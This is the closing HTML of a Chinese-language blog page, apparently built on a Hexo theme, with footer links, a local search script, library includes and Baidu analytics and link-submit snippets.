        <i class="fab fa-cuttlefish"></i>
    </a>


    <a href="https://www.zhihu.com/people/teamssix" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
        <i class="fab fa-zhihu1">知</i>
    </a>



    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?8bab20886c3df9c0d832a9b6aee45740";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    
    <script type="text/javascript" color="255,255,255"
        pointColor="255,255,255" opacity='0.7'
        zIndex="-1" count="99"
        src="/libs/background/canvas-nest.js"></script>
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
